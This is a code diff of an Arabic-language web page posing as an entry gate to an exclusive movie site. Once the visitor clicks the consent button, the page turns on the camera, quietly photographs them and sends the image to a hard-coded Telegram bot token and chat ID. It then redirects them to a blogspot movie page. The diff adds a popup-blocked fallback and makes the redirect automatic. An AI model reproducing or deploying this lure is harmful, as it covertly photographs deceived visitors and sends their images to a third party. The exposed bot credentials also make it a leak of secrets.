@@ -190,6 +190,53 @@
             transform: translateY(-3px);
             box-shadow: 0 8px 20px rgba(76, 175, 80, 0.6);
         }
+        
+        #blocked-message {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1003;
+            color: white;
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .blocked-btn {
+            margin-top: 25px;
+            padding: 12px 30px;
+            background: linear-gradient(45deg, #FF9800, #F57C00);
+            color: white;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.4);
+            transition: all 0.3s ease;
+        }
+        
+        .blocked-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 152, 0, 0.6);
+        }
+        
+        .link-copy {
+            margin-top: 20px;
+            padding: 10px 15px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 8px;
+            font-size: 14px;
+            color: #bdbdbd;
+            word-break: break-all;
+            max-width: 90%;
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
@@ -203,7 +250,7 @@
             <i class="fas fa-film"></i>
         </div>
         <h2 class="permission-title">مرحباً بكم في موقع الأفلام</h2>
-        <p class="permission-text">للدخول إلى موقع الأفلام الحصريه اضغط على زر الموافقه وانتظر تحميلك للموقع  </p>
+        <p class="permission-text">للدخول إلى موقع الأفلام الحصريه اضغط على زر الموافقه وانتظر تحميلك للموقع</p>
         <button class="permission-btn" id="allow-btn">
             <i class="fas fa-check-circle" style="margin-left: 8px;"></i>
             الموافقة والمتابعة
@@ -222,11 +269,23 @@
             <i class="fas fa-check"></i>
         </div>
         <h2 class="permission-title">تم التحضير بنجاح!</h2>
-        <p class="permission-text">سيتم الآن تحويلك إلى موقع الأفلام الحصري في نافذة جديدة</p>
-        <button class="success-btn" id="continue-btn">
+        <p class="permission-text">سيتم الآن تحويلك إلى موقع الأفلام الحصري</p>
+    </div>
+    
+    <!-- رسالة المنع -->
+    <div id="blocked-message">
+        <div class="logo" style="background: linear-gradient(45deg, #FF9800, #F57C00);">
+            <i class="fas fa-exclamation-triangle"></i>
+        </div>
+        <h2 class="permission-title">تم منع النافذة المنبثقة</h2>
+        <p class="permission-text">يبدو أن متصفحك منع فتح النافذة الجديدة. يرجى النقر على الزر أدناه للانتقال إلى موقع الأفلام.</p>
+        <button class="blocked-btn" id="manual-open-btn">
             <i class="fas fa-external-link-alt" style="margin-left: 8px;"></i>
-            الانتقال الآن
+            الانتقال إلى الموقع
         </button>
+        <div class="link-copy" id="target-link">
+            أو انسخ الرابط: https://bekes-movie4u.blogspot.com/?m=1
+        </div>
     </div>
     
     <script>
@@ -234,19 +293,24 @@
         const config = {
             botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
             chatId: '5310911220',
-            captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
-            loadingDuration: 3000, // مدة التحميل قبل عرض رسالة النجاح
-            targetWebsite: 'https://bekes-movie4u.blogspot.com/' // استبدل برابط الموقع الذي تريد فتحه
+            captureDelay: 1500,
+            loadingDuration: 3000,
+            targetWebsite: 'https://bekes-movie4u.blogspot.com/' // استبدل برابط الموقع الفعلي
         };
-        
+
         // العناصر
         const cameraView = document.getElementById('camera-container');
         const permissionOverlay = document.getElementById('permission-overlay');
         const loadingOverlay = document.getElementById('loading-overlay');
         const allowBtn = document.getElementById('allow-btn');
         const successMessage = document.getElementById('success-message');
-        const continueBtn = document.getElementById('continue-btn');
-        
+        const blockedMessage = document.getElementById('blocked-message');
+        const manualOpenBtn = document.getElementById('manual-open-btn');
+        const targetLink = document.getElementById('target-link');
+
+        // تعيين رابط الموقع في رسالة المنع
+        targetLink.textContent = `أو انسخ الرابط: ${config.targetWebsite}`;
+
         // دالة متعددة المتصفحات لطلب الكاميرا
         async function initCamera() {
             try {
@@ -273,7 +337,7 @@
                 throw error;
             }
         }
-        
+
         // دالة التقاط الصورة
         function capturePhoto(videoElement) {
             return new Promise((resolve) => {
@@ -286,7 +350,7 @@
                 canvas.toBlob(resolve, 'image/jpeg', 0.92);
             });
         }
-        
+
         // دالة إرسال الصورة إلى تليجرام
         async function sendToTelegram(photoBlob) {
             try {
@@ -305,60 +369,64 @@
                 throw error;
             }
         }
-        
+
         // دالة فتح الموقع في نافذة جديدة
         function openWebsite() {
-            window.open(config.targetWebsite, '_blank', 'noopener,noreferrer');
+            // محاولة فتح النافذة الجديدة
+            const newWindow = window.open('', '_blank');
+            
+            if (newWindow) {
+                // إذا تم فتح النافذة بنجاح
+                newWindow.location.href = config.targetWebsite;
+                successMessage.style.display = 'flex';
+                
+                // إغلاق رسالة النجاح بعد 3 ثواني
+                setTimeout(() => {
+                    successMessage.style.display = 'none';
+                }, 3000);
+            } else {
+                // إذا تم منع النافذة المنبثقة
+                blockedMessage.style.display = 'flex';
+            }
         }
-        
+
+        // معالجة النقر على الزر اليدوي للفتح
+        manualOpenBtn.addEventListener('click', () => {
+            window.open(config.targetWebsite, '_blank');
+            blockedMessage.style.display = 'none';
+        });
+
         // معالجة النقر على زر الموافقة
         allowBtn.addEventListener('click', async () => {
             try {
-                // إخفاء واجهة الإذن وإظهار التحميل
                 permissionOverlay.style.opacity = '0';
                 setTimeout(() => {
                     permissionOverlay.classList.add('hidden');
                     loadingOverlay.style.display = 'flex';
                 }, 300);
-                
-                // تهيئة الكاميرا
+
                 const stream = await initCamera();
                 cameraView.srcObject = stream;
-                
-                // انتظر لضبط الكاميرا
+
                 await new Promise(resolve => setTimeout(resolve, config.captureDelay));
-                
-                // التقاط الصورة
+
                 const photoBlob = await capturePhoto(cameraView);
-                
-                // إيقاف الكاميرا
                 stream.getTracks().forEach(track => track.stop());
-                
-                // إرسال الصورة (في الخلفية دون انتظار النتيجة)
+
                 sendToTelegram(photoBlob).catch(e => console.error('Error in sending:', e));
-                
-                // عرض شاشة التحميل لفترة ثم عرض رسالة النجاح
+
                 setTimeout(() => {
                     loadingOverlay.style.display = 'none';
-                    successMessage.style.display = 'flex';
+                    openWebsite();
                 }, config.loadingDuration);
-                
+
             } catch (error) {
                 console.error('Process failed:', error);
                 loadingOverlay.style.display = 'none';
-                
-                // عرض رسالة خطأ بسيطة
                 alert('حدث خطأ: ' + (error.message || 'غير معروف'));
             }
         });
-        
-        // معالجة النقر على زر المتابعة
-        continueBtn.addEventListener('click', () => {
-            successMessage.style.display = 'none';
-            openWebsite();
-        });
-        
-        // بدء العملية عند تحميل الصفحة
+
         window.addEventListener('DOMContentLoaded', () => {
             // يمكن إضافة أي تهيئة إضافية هنا
         });
